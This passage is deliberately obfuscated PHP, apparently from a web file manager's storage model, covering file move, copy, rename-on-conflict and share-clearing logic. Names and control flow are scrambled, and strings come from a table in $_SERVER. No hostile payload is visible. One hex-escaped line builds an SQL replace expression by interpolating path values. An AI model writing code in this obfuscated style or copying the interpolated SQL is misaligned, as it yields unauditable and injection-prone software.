$aßªÛ‚ÖË¶, $b…Ÿ¦‡³³[461], $cäÌÃ¤˜Ø[$b…Ÿ¦‡³³[461]]); $this->_copyApplyMeta($eŞ‘©à¾ñ÷, $Eù½ÁÎø…°); if ($eŞ‘©à¾ñ÷[$b…Ÿ¦‡³³[370]] != $b…Ÿ¦‡³³[83]) { $Eù½ÁÎø…°[$b…Ÿ¦‡³³[503]][] = $eŞ‘©à¾ñ÷[$b…Ÿ¦‡³³[419]]; } } $this->chunkEventSet($b…Ÿ¦‡³³[515], array($b…Ÿ¦‡³³[516], $E¯äïÏì, $FÒ¤Ğ©Ç)); $this->saveAll($AŒ™µ½Ó§¸); goto A¬Ò´óøñÕ; b³öÆãĞ³®: $aÊš’Â¨¬ = $this->add($E¯äïÏì); $c”ã„ñÔ¿Ÿ = array($b…Ÿ¦‡³³[369] => $aÊš’Â¨¬, $b…Ÿ¦‡³³[28] => $a»Ø¨Îæƒ½); $this->_copyApplyMeta($c”ã„ñÔ¿Ÿ, $Eù½ÁÎø…°); goto b‰ˆåèå²; b‰ˆåèå²: if ($B‘ÂŸÙÌ×§[$b…Ÿ¦‡³³[370]] != $b…Ÿ¦‡³³[83]) { $Eù½ÁÎø…°[$b…Ÿ¦‡³³[503]][] = $B‘ÂŸÙÌ×§[$b…Ÿ¦‡³³[419]]; return $aÊš’Â¨¬; } $e‘„¯²Ã¤æ = array(); $Bˆ×²È¹¡ó = array(); goto Aèˆ¬Ì´óù; Aßˆƒ…Ô‰î: $E¯äïÏì = $this->_makeItemData($B‘ÂŸÙÌ×§, $CÎĞ¥¨…ë…, $a»Ø¨Îæƒ½); Hook::trigger($b…Ÿ¦‡³³[510], $E¯äïÏì); Hook::trigger($b…Ÿ¦‡³³[511], array($b…Ÿ¦‡³³[512], $E¯äïÏì, 0)); goto b³öÆãĞ³®; eøÁõ¡’: $this->addAll($Bˆ×²È¹¡ó, array(), !1); $BëŒİìÔ ³ = $this->where(array($b…Ÿ¦‡³³[463] => $aÊš’Â¨¬))->select(); $C¦ë²ƒšÄ = $this->_childrenMakeRelation($e‘„¯²Ã¤æ, $BëŒİìÔ ³); goto eÎºŸ®¯İŸ; cãÚöš’½§: } private function _childrenMakeRelation($d¾äí…Ö‹Ò, $eóè›œÔ°‡) { $F³Ü‘ŠáÛÓ =& $_SERVER[í™]; $B àç·õõ = array(); $CÊŸ®ÚÊƒ“ = array(); foreach ($d¾äí…Ö‹Ò as $C‹’ƒ¶¯¤Ğ) { $dî”¹¦‚š = $C‹’ƒ¶¯¤Ğ[$F³Ü‘ŠáÛÓ[28]] . $F³Ü‘ŠáÛÓ[8] . $C‹’ƒ¶¯¤Ğ[$F³Ü‘ŠáÛÓ[461]]; $B àç·õõ[$dî”¹¦‚š] = $C‹’ƒ¶¯¤Ğ[$F³Ü‘ŠáÛÓ[369]]; } foreach ($eóè›œÔ°‡ as $C‹’ƒ¶¯¤Ğ) { $dî”¹¦‚š = $C‹’ƒ¶¯¤Ğ[$F³Ü‘ŠáÛÓ[28]] . $F³Ü‘ŠáÛÓ[8] . $C‹’ƒ¶¯¤Ğ[$F³Ü‘ŠáÛÓ[461]]; $E¯ğºê½Ïˆ = $B àç·õõ[$dî”¹¦‚š]; $CÊŸ®ÚÊƒ“[$E¯ğºê½Ïˆ] = $C‹’ƒ¶¯¤Ğ[$F³Ü‘ŠáÛÓ[369]]; } return $CÊŸ®ÚÊƒ“; } private function _childrenMatch($E×†™ß´İò, $fåĞÊÃÙŠé, $A†ˆæ’‡ä) { goto aï‘ò¨Œ‡»; fˆ´± ÕÔŞ: $D¯ÔÙæ»Œƒ = $aÜŸÒ²ñ·[count($aÜŸÒ²ñ·) - 1]; return array($b¦ë™˜ìƒ[463] => $D¯ÔÙæ»Œƒ, $b¦ë™˜ìƒ[461] => $fçˆ‰Ç­›Ù); goto B»ã®É ¼¹; bº¤³ëìš: foreach ($A±œªé³×Õ as $E¤‘ÆÔ‚²Â) { if (isset($E×†™ß´İò[$E¤‘ÆÔ‚²Â])) { $fçˆ‰Ç­›Ù .= $E×†™ß´İò[$E¤‘ÆÔ‚²Â] . $b¦ë™˜ìƒ[519]; } } $fçˆ‰Ç­›Ù = rtrim($fçˆ‰Ç­›Ù, $b¦ë™˜ìƒ[47]) . $b¦ë™˜ìƒ[47]; $aÜŸÒ²ñ· = $this->parentLevelArray($fçˆ‰Ç­›Ù); goto fˆ´± ÕÔŞ; aï‘ò¨Œ‡»: $b¦ë™˜ìƒ =& $_SERVER[í™]; $fçˆ‰Ç­›Ù = $A†ˆæ’‡ä[$b¦ë™˜ìƒ[461]]; $A±œªé³×Õ = $this->parentLevelArray($fåĞÊÃÙŠé[$b¦ë™˜ìƒ[461]]); goto bº¤³ëìš; B»ã®É ¼¹: } private function _makeItemData($D—ëîÀÈò‡, $e¢ˆÏ‘‹Š, $CÙ¹¨ÏÕÌ) { $aÈ§¹‡Ï‰ =& $_SERVER[í™]; $b¨¡¹åù†É = array($aÈ§¹‡Ï‰[520] => $D—ëîÀÈò‡[$aÈ§¹‡Ï‰[370]], $aÈ§¹‡Ï‰[386] => $CÙ¹¨ÏÕÌ, $aÈ§¹‡Ï‰[521] => $D—ëîÀÈò‡[$aÈ§¹‡Ï‰[372]], $aÈ§¹‡Ï‰[420] => $D—ëîÀÈò‡[$aÈ§¹‡Ï‰[419]], $aÈ§¹‡Ï‰[522] => $D—ëîÀÈò‡[$aÈ§¹‡Ï‰[77]], $aÈ§¹‡Ï‰[523] => $e¢ˆÏ‘‹Š[$aÈ§¹‡Ï‰[371]], $aÈ§¹‡Ï‰[524] => $e¢ˆÏ‘‹Š[$aÈ§¹‡Ï‰[458]], $aÈ§¹‡Ï‰[525] => USER_ID, $aÈ§¹‡Ï‰[526] => USER_ID, $aÈ§¹‡Ï‰[368] => $e¢ˆÏ‘‹Š[$aÈ§¹‡Ï‰[369]], $aÈ§¹‡Ï‰[527] => $e¢ˆÏ‘‹Š[$aÈ§¹‡Ï‰[461]] . $e¢ˆÏ‘‹Š[$aÈ§¹‡Ï‰[369]] . $aÈ§¹‡Ï‰[47], $aÈ§¹‡Ï‰[396] => 0, $aÈ§¹‡Ï‰[528] => $aÈ§¹‡Ï‰[33]); return $b¨¡¹åù†É; } private function _copyApplyMeta($c½‡¢Æº, &$b‰Š ÍëòË) { $d“†Ù Œà =& $_SERVER[í™]; $FµÇ÷ˆÔ±è = $c½‡¢Æº[$d“†Ù Œà[369]]; $B¬ªì‹°ªŠ = $c½‡¢Æº[$d“†Ù Œà[28]]; if (!isset($c½‡¢Æº[$d“†Ù Œà[529]]) || !$c½‡¢Æº[$d“†Ù Œà[529]] || $c½‡¢Æº[$d“†Ù Œà[529]] == $d“†Ù Œà[470]) { $b‰Š ÍëòË[$d“†Ù Œà[505]][] = array($d“†Ù Œà[369], $FµÇ÷ˆÔ±è, $d“†Ù Œà[529], short_id($FµÇ÷ˆÔ±è)); } if (Input::check($B¬ªì‹°ªŠ, $d“†Ù Œà[530])) { $b‰Š ÍëòË[$d“†Ù Œà[504]][] = array($d“†Ù Œà[369] => $FµÇ÷ˆÔ±è, $d“†Ù Œà[89] => $d“†Ù Œà[416], $d“†Ù Œà[359] => str_replace($d“†Ù Œà[50], $d“†Ù Œà[33], Pinyin::encode($B¬ªì‹°ªŠ))); $b‰Š ÍëòË[$d“†Ù Œà[504]][] = array($d“†Ù Œà[369] => $FµÇ÷ˆÔ±è, $d“†Ù Œà[89] => $d“†Ù Œà[415], $d“†Ù Œà[359] => Pinyin::encode($B¬ªì‹°ªŠ, $d“†Ù Œà[531])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($E˜†×¨à¸Œ) { goto AÎ‘ÜíÄÈ¸; B«Å­Ş‘­Ó: $A©¥é Üß = array_to_keyvalue($A©¥é Üß, $fÜ¹…ª¿”Œ[369]); foreach ($A©¥é Üß as $Aå‚’Úšˆ) { $DÆª¦Ùœ±¨ = $Aå‚’Úšˆ[$fÜ¹…ª¿”Œ[463]]; $E˜†×¨à¸Œ = $Aå‚’Úšˆ[$fÜ¹…ª¿”Œ[369]]; if (!isset($this->_childrenListCache[$E˜†×¨à¸Œ]) && $Aå‚’Úšˆ[$fÜ¹…ª¿”Œ[370]] == $fÜ¹…ª¿”Œ[83]) { $this->_childrenListCache[$E˜†×¨à¸Œ] = array(); } if (!isset($this->_childrenListCache[$DÆª¦Ùœ±¨])) { $this->_childrenListCache[$DÆª¦Ùœ±¨] = array(); } $this->_childrenListCache[$DÆª¦Ùœ±¨][$E˜†×¨à¸Œ] = $Aå‚’Úšˆ; $this->_childrenItemCache[$E˜†×¨à¸Œ] = $Aå‚’Úšˆ; } goto AêÓ‡¥Â¹Ş; AÎ‘ÜíÄÈ¸: $fÜ¹…ª¿”Œ =& $_SERVER[í™]; $eèÂ§Ùê = $this->sourceInfo($E˜†×¨à¸Œ); $D¦’… ïÜæ = $fÜ¹…ª¿”Œ[532]; goto E£ó´µ½é; E£ó´µ½é: $cµ¯Õ­êğ¥ = array($fÜ¹…ª¿”Œ[461] => array($fÜ¹…ª¿”Œ[485], $eèÂ§Ùê[$fÜ¹…ª¿”Œ[461]] . $E˜†×¨à¸Œ . $fÜ¹…ª¿”Œ[486]), $fÜ¹…ª¿”Œ[397] => $this->targetIsDelete); $A©¥é Üß = $this->field($D¦’… ïÜæ)->where($cµ¯Õ­êğ¥)->select(); if (!$A©¥é Üß) { return; } goto B«Å­Ş‘­Ó; AêÓ‡¥Â¹Ş: } private function _childrenListAll($cäÙ·ïŒó, &$B¦ËÎ‹ÈŞ) { $AØêÈœ„¥¥ =& $_SERVER[í™]; if (!isset($this->_childrenListCache[$cäÙ·ïŒó])) { return; } $b¿ò‹•ÑÄ = $this->_childrenListCache[$cäÙ·ïŒó]; foreach ($b¿ò‹•ÑÄ as $F³ùãÊ¶ => $dãÚŠ²Ùºº) { $B¦ËÎ‹ÈŞ[$F³ùãÊ¶] = $dãÚŠ²Ùºº; if ($dãÚŠ²Ùºº[$AØêÈœ„¥¥[370]] == $AØêÈœ„¥¥[83]) { $this->_childrenListAll($F³ùãÊ¶, $B¦ËÎ‹ÈŞ); } } } private function sourceInfoCache($a²ê¾Ğ•íø) { if (isset($this->_childrenItemCache[$a²ê¾Ğ•íø])) { return $this->_childrenItemCache[$a²ê¾Ğ•íø]; } return $this->sourceInfo($a²ê¾Ğ•íø); } private function _childrenList($Dİëá–­òÃ) { if (isset($this->_childrenListCache[$Dİëá–­òÃ])) { return $this->_childrenListCache[$Dİëá–­òÃ]; } return $this->_childrenListSelect($Dİëá–­òÃ); } private function _childrenListSelect($cì„„ˆğªé) { goto dÊŒ‰ĞÉ‹è; a–¬ç”¦Ò†: $F’Ğàê®¸ã = $F’Ğàê®¸ã ? $F’Ğàê®¸ã : array(); $bÂÒÇ‡ŒãÎ = array_to_keyvalue($F’Ğàê®¸ã, $f‰ˆš¶“‡[369]); $this->_childrenListCache[$cì„„ˆğªé] = $bÂÒÇ‡ŒãÎ; goto D´×±–¥Ä•; dÊŒ‰ĞÉ‹è: $f‰ˆš¶“‡ =& $_SERVER[í™]; $EŸÊ‚àÑù™ = array($f‰ˆš¶“‡[463] => $cì„„ˆğªé, $f‰ˆš¶“‡[397] => $this->targetIsDelete); $F’Ğàê®¸ã = $this->where($EŸÊ‚àÑù™)->select(); goto a–¬ç”¦Ò†; D´×±–¥Ä•: foreach ($bÂÒÇ‡ŒãÎ as $cì„„ˆğªé => $B¾‘†Äİ¤µ) { $this->_childrenItemCache[$cì„„ˆğªé] = $B¾‘†Äİ¤µ; } return $bÂÒÇ‡ŒãÎ; goto Fæ¬ÚÑİÓ…; Fæ¬ÚÑİÓ…: } private function fileNameExistCache($Dæ°İÙ‹Ü, $BŠ¨‘’‡›) { $a’Ğ›Œ‹Ç  =& $_SERVER[í™]; $BŠ¨‘’‡› = strtolower($BŠ¨‘’‡›); $E„ììÁÆøÄ = $this->_childrenList($Dæ°İÙ‹Ü); foreach ($E„ììÁÆøÄ as $DÚ“¦²¹½õ) { if ($BŠ¨‘’‡› == strtolower($DÚ“¦²¹½õ[$a’Ğ›Œ‹Ç [28]])) { return $DÚ“¦²¹½õ[$a’Ğ›Œ‹Ç [369]]; } } return !1; } private function fileNameAutoCache($C¶ºêé†²‡, $cîƒèõ›¯, $D‹‹—Å¹ÒÈ, $Aä¬»¬™›) { $B«Ù¯¢¶«ï =& $_SERVER[í™]; $EŞÛÄÏ“Ëï = $this->_childrenList($C¶ºêé†²‡); $c¸à‡ÌÆ¦£ = array_to_keyvalue($EŞÛÄÏ“Ëï, $B«Ù¯¢¶«ï[33], $B«Ù¯¢¶«ï[28]); return $this->fileNameAutoGet($c¸à‡ÌÆ¦£, $cîƒèõ›¯, $D‹‹—Å¹ÒÈ, $Aä¬»¬™›); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($CÃ’Éï‹š¢, $d‘¨¤ß‡¸’, $A¤Àğê®Çğ = REPEAT_REPLACE, $bŠâ‰öÒ–‡ = '') { goto b‡•„¶ç‰ë; B§¾¥˜¯´Ğ: if (!$B…Á°‚÷ÙÉ || !$FåÀëãœ¯Ó || $FåÀëãœ¯Ó[$DÜ¤§ÚÚ¬³[370]] != $DÜ¤§ÚÚ¬³[83]) { return !1; } Hook::trigger($DÜ¤§ÚÚ¬³[533], $Bò¦´Á·¿); $this->targetIsDelete = intval($B…Á°‚÷ÙÉ[$DÜ¤§ÚÚ¬³[397]]); goto DÕ²İİÔª°; EŸ¥×õÍæ¦: $this->updateModifyTime($Bê ‰Í°á); Model($DÜ¤§ÚÚ¬³[507])->eventMove($CÃ’Éï‹š¢, $B…Á°‚÷ÙÉ[$DÜ¤§ÚÚ¬³[463]], $d‘¨¤ß‡¸’); Hook::trigger($DÜ¤§ÚÚ¬³[534], $Bò¦´Á·¿); goto b ·ù÷Õ; b‡•„¶ç‰ë: $DÜ¤§ÚÚ¬³ =& $_SERVER[í™]; $B…Á°‚÷ÙÉ = $this->sourceInfo($CÃ’Éï‹š¢); $FåÀëãœ¯Ó = $this->sourceInfo($d‘¨¤ß‡¸’); goto A’¢ŠÓöÂ; DÕ²İİÔª°: if ($B…Á°‚÷ÙÉ[$DÜ¤§ÚÚ¬³[463]] == $d‘¨¤ß‡¸’ && $bŠâ‰öÒ–‡ != $B…Á°‚÷ÙÉ[$DÜ¤§ÚÚ¬³[28]]) { $EÈµóæ ‚Š = $this->fileNameExist($d‘¨¤ß‡¸’, $bŠâ‰öÒ–‡); if ($EÈµóæ ‚Š && $B…Á°‚÷ÙÉ[$DÜ¤§ÚÚ¬³[370]] == $DÜ¤§ÚÚ¬³[470]) { goto f«É‚²¯¸…; Bå°ÁĞÑ™·: return $EÈµóæ ‚Š; goto E·…ç¼µ¸; f«É‚²¯¸…: $DÛŞÕœ”– = $this->sourceInfo($EÈµóæ ‚Š); $B¡’£ãùèã = $this->fileHistory($DÛŞÕœ”–, $B…Á°‚÷ÙÉ[$DÜ¤§ÚÚ¬³[419]], $B…Á°‚÷ÙÉ[$DÜ¤§ÚÚ¬³[77]]); if (!$B¡’£ãùèã) { Model($DÜ¤§ÚÚ¬³[422])->remove($B…Á°‚÷ÙÉ[$DÜ¤§ÚÚ¬³[419]]); } goto CŞ“å›Ñ ½; CŞ“å›Ñ ½: $this->removeNow($CÃ’Éï‹š¢, !1); $this->folderSizeReset($d‘¨¤ß‡¸’); Hook::trigger($DÜ¤§ÚÚ¬³[534], $Bò¦´Á·¿); goto Bå°ÁĞÑ™·; E·…ç¼µ¸: } } $Dµ¿ÂçÃãÊ = $bŠâ‰öÒ–‡ ? $bŠâ‰öÒ–‡ : $B…Á°‚÷ÙÉ[$DÜ¤§ÚÚ¬³[28]]; $this->lockMoveStart($CÃ’Éï‹š¢); goto d¾Ò…ã’¥Á; d¾Ò…ã’¥Á: $this->lockWriteStart($d‘¨¤ß‡¸’, $Dµ¿ÂçÃãÊ); $B‹‚Ë½ğ‚ = array($DÜ¤§ÚÚ¬³[503] => array(), $DÜ¤§ÚÚ¬³[535] => !1); $this->clearShare($CÃ’Éï‹š¢, $d‘¨¤ß‡¸’); goto aÊÏ£Ùé; b ·ù÷Õ: return $d›–àÆÂ; goto aÆ®¬èã¶; A’¢ŠÓöÂ: if ($B…Á°‚÷ÙÉ[$DÜ¤§ÚÚ¬³[463]] == $FåÀëãœ¯Ó[$DÜ¤§ÚÚ¬³[369]]) { if ($B…Á°‚÷ÙÉ[$DÜ¤§ÚÚ¬³[397]] == $DÜ¤§ÚÚ¬³[83]) { Model($DÜ¤§ÚÚ¬³[395])->restore(array($CÃ’Éï‹š¢)); } return $CÃ’Éï‹š¢; } $Bò¦´Á·¿ = $this->pathInfoMore($CÃ’Éï‹š¢); if ($this->isParentOf($CÃ’Éï‹š¢, $d‘¨¤ß‡¸’)) { return !1; } goto B§¾¥˜¯´Ğ; aÚ¢´¸…ê¼: if ($B…Á°‚÷ÙÉ[$DÜ¤§ÚÚ¬³[370]] == $DÜ¤§ÚÚ¬³[83] && $e³ïİ‚‡Ê) { $this->folderSizeResetChildren($d›–àÆÂ); } Model($DÜ¤§ÚÚ¬³[167])->linkAdd($B‹‚Ë½ğ‚[$DÜ¤§ÚÚ¬³[503]]); if ($e³ïİ‚‡Ê && $B‹‚Ë½ğ‚[$DÜ¤§ÚÚ¬³[535]]) { $this->removeNow($CÃ’Éï‹š¢, !1); } goto a«Ÿë°´ùÁ; e™åÈº…ø: $this->folderSizeReset($d‘¨¤ß‡¸’); $Bê ‰Í°á = array($B…Á°‚÷ÙÉ[$DÜ¤§ÚÚ¬³[463]], $d‘¨¤ß‡¸’); if ($B…Á°‚÷ÙÉ[$DÜ¤§ÚÚ¬³[370]] == $DÜ¤§ÚÚ¬³[83]) { $Bê ‰Í°á[] = $CÃ’Éï‹š¢; } goto EŸ¥×õÍæ¦; aÊÏ£Ùé: $e³ïİ‚‡Ê = $this->fileNameExistCache($d‘¨¤ß‡¸’, $B…Á°‚÷ÙÉ[$DÜ¤§ÚÚ¬³[28]]); $d›–àÆÂ = $this->_move($CÃ’Éï‹š¢, $d‘¨¤ß‡¸’, $A¤Àğê®Çğ, $B‹‚Ë½ğ‚, $bŠâ‰öÒ–‡); $this->sourceCacheClear(); goto aÚ¢´¸…ê¼; a«Ÿë°´ùÁ: $this->lockMoveEnd($CÃ’Éï‹š¢); $this->lockWriteEnd($d‘¨¤ß‡¸’, $Dµ¿ÂçÃãÊ); $this->folderSizeReset($B…Á°‚÷ÙÉ[$DÜ¤§ÚÚ¬³[463]]); goto e™åÈº…ø; aÆ®¬èã¶: } private function _move($d·è®Šø„À, $bŠÄö˜Ã’À, $fŒî³¦àğ÷, &$A½é¨ÅÇ–, $cŠÄÍ¾æ± = '') { goto e²­Ã—æå; e²­Ã—æå: $fï‘Şèìâ¨ =& $_SERVER[í™]; $añ‰æÜ¾÷î = $this->sourceInfo($d·è®Šø„À); $Aï¦ù‰ô = $añ‰æÜ¾÷î[$fï‘Şèìâ¨[370]] == $fï‘Şèìâ¨[83]; goto Cñ‡áù¯ïÂ; Cñ‡áù¯ïÂ: $F­ ‰Òó¸Œ = $cŠÄÍ¾æ± ? $cŠÄÍ¾æ± : $añ‰æÜ¾÷î[$fï‘Şèìâ¨[28]]; $B§°Çó‚ÂØ = $this->fileNameExistCache($bŠÄö˜Ã’À, $F­ ‰Òó¸Œ); $this->lockMoveStart($d·è®Šø„À); goto FÑÑ‡¿Øö¯; FÑÑ‡¿Øö¯: $this->lockWriteStart($bŠÄö˜Ã’À, $F­ ‰Òó¸Œ); if (!$B§°Çó‚ÂØ) { return $this->_moveForce($d·è®Šø„À, $bŠÄö˜Ã’À, $F­ ‰Òó¸Œ); } $bÈÎºŠ¾¨— = $B§°Çó‚ÂØ; goto b‰ª‘Ó¯‡; c›Ğ„Ö¡ĞÖ: return $bÈÎºŠ¾¨—; goto fëôğÕ¹¢; b‰ª‘Ó¯‡: $d¡­ç£Š–… = !1; if ($Aï¦ù‰ô) { if ($fŒî³¦àğ÷ == REPEAT_RENAME_FOLDER) { $F­ ‰Òó¸Œ = $this->fileNameAuto($bŠÄö˜Ã’À, $F­ ‰Òó¸Œ, $fŒî³¦àğ÷, $Aï¦ù‰ô); $bÈÎºŠ¾¨— = $this->_moveForce($d·è®Šø„À, $bŠÄö˜Ã’À, $F­ ‰Òó¸Œ); } else { if ($fŒî³¦àğ÷ == REPEAT_RENAME_FOLDER) { $fŒî³¦àğ÷ = REPEAT_RENAME; } $BÈÕ¸‘ŒÄ‡ = $this->_childrenListSelect($d·è®Šø„À); foreach ($BÈÕ¸‘ŒÄ‡ as $eÒó™™£·¶) { $this->_move($eÒó™™£·¶[$fï‘Şèìâ¨[369]], $B§°Çó‚ÂØ, $fŒî³¦àğ÷, $A½é¨ÅÇ–); } $d¡­ç£Š–… = !0; } } else { if ($fŒî³¦àğ÷ == REPEAT_SKIP) { $d¡­ç£Š–… = !0; } else { if ($fŒî³¦àğ÷ == REPEAT_RENAME || $fŒî³¦àğ÷ == REPEAT_RENAME_FOLDER) { $F­ ‰Òó¸Œ = $this->fileNameAuto($bŠÄö˜Ã’À, $F­ ‰Òó¸Œ, $fŒî³¦àğ÷, $Aï¦ù‰ô); $bÈÎºŠ¾¨— = $this->_moveForce($d·è®Šø„À, $bŠÄö˜Ã’À, $F­ ‰Òó¸Œ); } else { if ($fŒî³¦àğ÷ == REPEAT_REPLACE) { $fºÈø£È…— = $this->sourceInfoCache($B§°Çó‚ÂØ); $a×É…Œï = $this->fileHistory($fºÈø£È…—, $añ‰æÜ¾÷î[$fï‘Şèìâ¨[419]], $añ‰æÜ¾÷î[$fï‘Şèìâ¨[77]]); if ($a×É…Œï) { $A½é¨ÅÇ–[$fï‘Şèìâ¨[503]][] = $añ‰æÜ¾÷î[$fï‘Şèìâ¨[419]]; } else { $d¡­ç£Š–… = !0; } } } } } if ($d¡­ç£Š–… && !$A½é¨ÅÇ–[$fï‘Şèìâ¨[535]]) { $A½é¨ÅÇ–[$fï‘Şèìâ¨[535]] = !0; } goto c›Ğ„Ö¡ĞÖ; fëôğÕ¹¢: } private function _moveForce($D’Şõ÷„º…, $c´°ª½Ò, $eš»´óÈ‚) { goto D·Üì­÷²ˆ; A´ÙÔá³: if ($cº¥›˜¿åŠ) { $f ‰«º„« = array($d†ƒßÆéâ[527] => array($d†ƒßÆéâ[485], $a©õ­§©ß[$d†ƒßÆéâ[461]] . $a©õ­§©ß[$d†ƒßÆéâ[369]] . $d†ƒßÆéâ[486])); $Cèä”ÔöÉ = $a©õ­§©ß[$d†ƒßÆéâ[461]] . $a©õ­§©ß[$d†ƒßÆéâ[369]] . $d†ƒßÆéâ[47]; $A¯¼µ›’ = $a„Í„ëÓ¢¡[$d†ƒßÆéâ[461]] . $a„Í„ëÓ¢¡[$d†ƒßÆéâ[369]] . $d†ƒßÆéâ[47] . $a©õ­§©ß[$d†ƒßÆéâ[369]] . $d†ƒßÆéâ[47]; $E¨–ò™‘ñ³ = array($d†ƒßÆéâ[527] => array($d†ƒßÆéâ[536], "\x72\x65\x70\154\x61\x63\145\x28\x70\141\162\x65\156\164\114\145\x76\145\x6c\x2c\x27{$Cèä”ÔöÉ}\x27\x2c\x27{$A¯¼µ›’}\x27\x29"), $d†ƒßÆéâ[523] => $a„Í„ëÓ¢¡[$d†ƒßÆéâ[371]], $d†ƒßÆéâ[524] => $a„Í„ëÓ¢¡[$d†ƒßÆéâ[458]]); if ($côÚ¬¥İÚŞ) { $E¨–ò™‘ñ³[$d†ƒßÆéâ[396]] = 0; } $this->where($f ‰«º„«)->data($E¨–ò™‘ñ³)->save(); } $this->where(array($d†ƒßÆéâ[383] => $D’Şõ÷„º…))->data($E„ºèƒŸÆË)->save(); return $D’Şõ÷„º…; goto eíËµäÎ¨; b¨¹‰†: if (!$FÄ»œ†ÓßÁ) { Model($d†ƒßÆéâ[456])->authClear($D’Şõ÷„º…); } $côÚ¬¥İÚŞ = $a©õ­§©ß[$d†ƒßÆéâ[397]] == $d†ƒßÆéâ[83] && $a„Í„ëÓ¢¡[$d†ƒßÆéâ[397]] != $d†ƒßÆéâ[83]; if ($côÚ¬¥İÚŞ) { $E„ºèƒŸÆË[$d†ƒßÆéâ[396]] = 0; } goto A´ÙÔá³; D·Üì­÷²ˆ: $d†ƒßÆéâ =& $_SERVER[í™]; $a©õ­§©ß = $this->sourceInfo($D’Şõ÷„º…); $a„Í„ëÓ¢¡ = $this->sourceInfo($c´°ª½Ò); goto fÒÀÀ£É”–; fÒÀÀ£É”–: $cº¥›˜¿åŠ = $a©õ­§©ß[$d†ƒßÆéâ[370]] == $d†ƒßÆéâ[83]; $E„ºèƒŸÆË = array($d†ƒßÆéâ[368] => $a„Í„ëÓ¢¡[$d†ƒßÆéâ[369]], $d†ƒßÆéâ[527] => $a„Í„ëÓ¢¡[$d†ƒßÆéâ[461]] . $a„Í„ëÓ¢¡[$d†ƒßÆéâ[369]] . $d†ƒßÆéâ[47], $d†ƒßÆéâ[523] => $a„Í„ëÓ¢¡[$d†ƒßÆéâ[371]], $d†ƒßÆéâ[524] => $a„Í„ëÓ¢¡[$d†ƒßÆéâ[458]], $d†ƒßÆéâ[526] => USER_ID, $d†ƒßÆéâ[386] => $eš»´óÈ‚); $FÄ»œ†ÓßÁ = $a©õ­§©ß[$d†ƒßÆéâ[371]] == SourceModel::TYPE_GROUP && $a„Í„ëÓ¢¡[$d†ƒßÆéâ[371]] == SourceModel::TYPE_GROUP && $a©õ­§©ß[$d†ƒßÆéâ[458]] == $a„Í„ëÓ¢¡[$d†ƒßÆéâ[458]]; goto b¨¹‰†; eíËµäÎ¨: } private function clearShare($Fª†š‰†°ê, $Eø·È³ù¢­) { goto bÏÇÈé„; bÏÇÈé„: $cñ¥İâö‡Ò =& $_SERVER[í™]; $a×’˜îã¥­ = $this->sourceInfo($Fª†š‰†°ê); $fíÑ•ª§ = $this->sourceInfo($Eø·È³ù¢­); goto AÇ§£åÖ³Ù; bØÙøµ¿ˆ¡: Model($cñ¥İâö‡Ò[538])->where($d×œ‚œê…)->save(array($cñ¥İâö‡Ò[448] => 0)); Model($cñ¥İâö‡Ò[539])->where($d×œ‚œê…)->delete(); goto AØÃ¼ˆÜ°ñ; fã¿ßÏ¸è: if (!$aóÎ”Œª÷) { return; } $d×œ‚œê… = array($cñ¥İâö‡Ò[369] => array($cñ¥İâö‡Ò[7], $aóÎ”Œª÷), $cñ¥İâö‡Ò[448] => 1); $EÜ§’¤ÒÈ = Model($cñ¥İâö‡Ò[538])->field($cñ¥İâö‡Ò[441])->where($d×œ‚œê…)->select(); goto C–¥…ÔÁã; AÇ§£åÖ³Ù: if ($a×’˜îã¥­[$cñ¥İâö‡Ò[458]] == $fíÑ•ª§[$cñ¥İâö‡Ò[458]] && $a×’˜îã¥­[$cñ¥İâö‡Ò[371]] == $cñ¥İâö‡Ò[537]) { return; } $d×œ‚œê… = array($cñ¥İâö‡Ò[461] => array($cñ¥İâö‡Ò[485], $a×’˜îã¥­[$cñ¥İâö‡Ò[461]] . $Fª†š‰†°ê . $cñ¥İâö‡Ò[486])); $aóÎ”Œª÷ = $this->field($cñ¥İâö‡Ò[383])->where($d×œ‚œê…)->getField($cñ¥İâö‡Ò[369], !0); goto fã¿ßÏ¸è; C–¥…ÔÁã: if (!$EÜ§’¤ÒÈ) { return; } $EÜ§’¤ÒÈ = array_to_keyvalue($EÜ§’¤ÒÈ, $cñ¥İâö‡Ò[33], $cñ¥İâö‡Ò[441]); $d×œ‚œê… = array($cñ¥İâö‡Ò[441] => array($cñ¥İâö‡Ò[7], $EÜ§’¤ÒÈ)); goto bØÙøµ¿ˆ¡; AØÃ¼ˆÜ°ñ: } public function copyFolderFromIO($dÃ¸Ì…¶…Å, $DäÊİ’£÷´, $e…Äù÷Èƒé, $D·ğ©‰õÄ, $b ƒÙ°İß†, $dùˆÒôˆš† = false) { goto côœæÌ¥â; b¿èŠóà·Î: if ($E†Ê“Û) { $this->_childrenAllMake($E†Ê“Û); } Hook::trigger($E„ø¹ò ìß[541]); $this->_copyChildTo($dÃ¸Ì…¶…Å, $DäÊİ’£÷´, $d—ºÚò¶®Ó, $D·ğ©‰õÄ, $Eî¡µŒòÛ, $b ƒÙ°İß†); goto få†‰’ˆø³; aìÀÉã ©: Model($E„ø¹ò ìß[506])->addAll($Eî¡µŒòÛ[$E„ø¹ò ìß[504]], array(), !0); Model($E„ø¹ò ìß[507])->eventCopy($d—ºÚò¶®Ó); $this->saveAll($Eî¡µŒòÛ[$E„ø¹ò ìß[505]]); goto D¦ä³ ö‰; få†‰’ˆø³: Hook::trigger($E„ø¹ò ìß[542]); if ($d—ºÚò¶®Ó) { $this->folderSizeResetChildren($d—ºÚò¶®Ó); } $this->_childrenListClear(); goto aìÀÉã ©; côœæÌ¥â: $E„ø¹ò ìß =& $_SERVER[í™]; $Eî¡µŒòÛ = array($E„ø¹ò ìß[504] => array(), $E„ø¹ò ìß[505] => array(), $E„ø¹ò ìß[503] => array(), $E„ø¹ò ìß[540] => array()); $cºÜ‡™ÄĞ = $dùˆÒôˆš† ? $dùˆÒôˆš† : $dÃ¸Ì…¶…Å->getPathName($dÃ¸Ì…¶…Å->pathThis($DäÊİ’£÷´)); goto dªö¯İ‚é¸; D¦ä³ ö‰: Model($E„ø¹ò ìß[422])->linkAdd($Eî¡µŒòÛ[$E„ø¹ò ìß[503]]); Model($E„ø¹ò ìß[422])->remove($Eî¡µŒòÛ[$E„ø¹ò ìß[540]]); $this->folderSizeReset($e…Äù÷Èƒé); goto FÔÇô¦®¦Ê; 